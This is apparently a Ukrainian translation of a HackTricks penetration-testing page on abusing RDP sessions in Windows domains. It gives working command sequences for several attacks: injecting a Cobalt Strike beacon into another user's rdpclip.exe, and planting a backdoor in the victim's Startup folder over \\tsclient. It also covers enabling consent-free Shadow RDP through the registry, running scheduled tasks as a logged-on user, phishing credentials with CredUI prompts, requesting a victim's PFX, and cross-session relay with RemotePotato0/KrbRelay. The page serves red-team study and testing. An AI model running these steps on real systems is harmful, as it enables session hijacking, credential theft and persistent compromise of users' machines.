# RDP Sessions Abuse

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

Якщо **зовнішня група** має **доступ через RDP** до **комп’ютера** в поточному домені, зловмисник, який скомпрометував цей комп’ютер, може дочекатися підключення учасника групи.

Щойно користувач підключиться через RDP, **зловмисник може перейти до сеансу цього користувача** й скористатися його правами у зовнішньому домені.

```bash
# Supposing the group "External Users" has RDP access in the current domain
## Find which computers they can access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 ...
 4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```

Перегляньте **інші способи викрадення сесій за допомогою інших інструментів** [**на цій сторінці.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## Ретрансляція автентифікації між сесіями

**Активна консольна сесія або RDP-сесія**, що належить іншому користувачеві домену, також може стати зачіпкою, якщо ви маєте shell із нижчими привілеями на тому самому хості. Активація DCOM між сесіями може змусити відповідний COM-сервер у цій інтерактивній сесії виконати автентифікацію, а такі інструменти, як RemotePotato0 або KrbRelay, можуть перехопити або ретранслювати цю автентифікацію. Користувач, який увійшов у систему, не обов’язково має бути адміністратором домену: для подальшого переходу може вистачити вузько визначеного права в каталозі, наприклад дозволу на читання керованого пароля gMSA.<sup>[[6]](#references)[[7]](#references)[[9]](#references)</sup>

Спершу визначте ID сесії та особу користувача за допомогою `query user`, `qwinsta` або наявного виводу інвентаризації сесій winPEAS. Вважайте їх **кандидатами**, а не доказом наявності шляху ретрансляції. Значення мають COM-клас, рівні імперсонації та автентифікації, доступність сесії, маршрутизація firewall/OXID, захист цільового протоколу й ефективні права користувача, який увійшов у систему. У документації KrbRelay наведено приклади міжсесійної взаємодії з LDAP, HTTP, SMB і NTLM, але ці шляхи залежать від версії та конфігурації. Прив’язка LDAP-каналу — ще один бар’єр для ретрансляції на цільовому боці. Зокрема, у проєкті RemotePotato0 зазначено, що початковий сценарій експлуатації RPC-to-LDAP було виправлено у 2022 році; не робіть висновку про успішну ретрансляцію LDAP лише на підставі наявності видимої сесії.<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)</sup>

## RDPInception

Якщо користувач підключається **через RDP до машини**, де на нього **чекає** **зловмисник**, той зможе **впровадити beacon у RDP-сесію користувача**, а якщо **жертва підключила свій диск** під час доступу через RDP, **зловмисник зможе отримати до нього доступ**.

У такому разі можна просто **скомпрометувати** **оригінальний комп’ютер** **жертви**, записавши **бекдор** у **папку автозапуску**.

```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 ...
 4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     02/20/2021 10:15:23   Config.Msi
          dir     10/18/2016 01:59:39   Documents and Settings
          [...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```

## Shadow RDP

Якщо ви є **локальним адміністратором** на хості, де жертва вже має **активний сеанс RDP**, ви можете **переглядати робочий стіл і керувати ним, не викрадаючи пароль і не дампячи LSASS**.<sup>[[1]](#references)</sup>

Це залежить від політики **тіньового підключення Remote Desktop Services**, що зберігається в:<sup>[[2]](#references)</sup><sup>[[3]](#references)</sup>

```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```

Цікаві значення:

- `0`: Вимкнено
- `1`: `EnableInputNotify` (керування, потрібне схвалення користувача)
- `2`: `EnableInputNoNotify` (керування, **схвалення користувача не потрібне**)
- `3`: `EnableNoInputNotify` (лише перегляд, потрібне схвалення користувача)
- `4`: `EnableNoInputNoNotify` (лише перегляд, **схвалення користувача не потрібне**)

```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```

Це особливо корисно, якщо привілейований користувач, підключений через RDP, залишив розблокований робочий стіл, сеанс KeePass, консоль MMC, сеанс браузера або відкриту оболонку адміністратора.

## Scheduled Tasks As Logged-On User

Якщо ви **локальний адміністратор**, а цільовий користувач **зараз увійшов у систему**, Task Scheduler може запускати код **від імені цього користувача без його пароля**.<sup>[[1]](#references)</sup><sup>[[4]](#references)</sup>

Це перетворює наявний сеанс входу жертви на механізм виконання:

```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```

Примітки:

- Якщо користувач **не ввійшов у систему**, Windows зазвичай вимагає пароль, щоб створити завдання, яке запускатиметься від його імені.
- Якщо користувач **увійшов у систему**, завдання може повторно використати наявний контекст входу.
- Це практичний спосіб виконувати дії з GUI або запускати бінарні файли в сеансі жертви, не торкаючись LSASS.

## Зловживання CredUI Prompt із сеансу жертви

Отримавши змогу виконувати код **на інтерактивному робочому столі жертви** (наприклад, через **Shadow RDP** або **заплановане завдання, запущене від імені цього користувача**), можна відобразити **справжнє вікно запиту облікових даних Windows** за допомогою API CredUI та викрасти облікові дані, які введе жертва.<sup>[[1]](#references)</sup>

Відповідні API:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

Типовий процес:

1. Запустити бінарний файл у сеансі жертви.
2. Відобразити запит автентифікації домену, оформлений відповідно до брендингу поточного домену.
3. Розпакувати отриманий буфер автентифікації.
4. Перевірити надані облікові дані й, за потреби, повторювати запит, доки не буде введено дійсні облікові дані.

Це корисно для **фішингу на хості**, оскільки запит відображається за допомогою стандартних API Windows, а не підробленої HTML-форми.

## Запит PFX у контексті жертви

Той самий примітив **запланованого завдання від імені користувача** можна використати, щоб запросити **сертифікат/PFX від імені жертви, яка ввійшла в систему**. Цей сертифікат згодом можна використати для **автентифікації в AD** як цього користувача, повністю уникаючи викрадення пароля.<sup>[[1]](#references)</sup><sup>[[5]](#references)</sup>

Загальний процес:

1. Отримати **права локального адміністратора** на хості, де жертва ввійшла в систему.
2. Виконати логіку запиту/експорту від імені жертви за допомогою **запланованого завдання**.
3. Експортувати отриманий **PFX**.
4. Використати PFX для PKINIT / автентифікації в AD на основі сертифіката.

Докладніше про подальше зловживання див. на сторінках AD CS:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## References

- [1] [SensePost — від плоских мереж до заблокованих доменів за допомогою моделей tiering](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [2] [Microsoft Learn — параметри тіньового сеансу `mstsc`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc)
- [3] [NetExec — PR плагіна Shadow RDP #465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [4] [NetExec — модуль schtask_as](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [5] [NetExec — запит PFX через заплановане завдання, PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)
- [6] [RemotePotato0 — активація DCOM між сеансами та поточні обмеження](https://github.com/antonioCoco/RemotePotato0)
- [7] [KrbRelay — приклади relay між сеансами та вимоги до CLSID](https://github.com/cube0x0/KrbRelay)
- [8] [Microsoft — команда query session](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/query-session)
- [9] [Microsoft — атрибут ms-DS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [10] [Microsoft — прив’язування каналу LDAP і захист від relay-атак](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding)
{{#include ../../banners/hacktricks-training.md}}
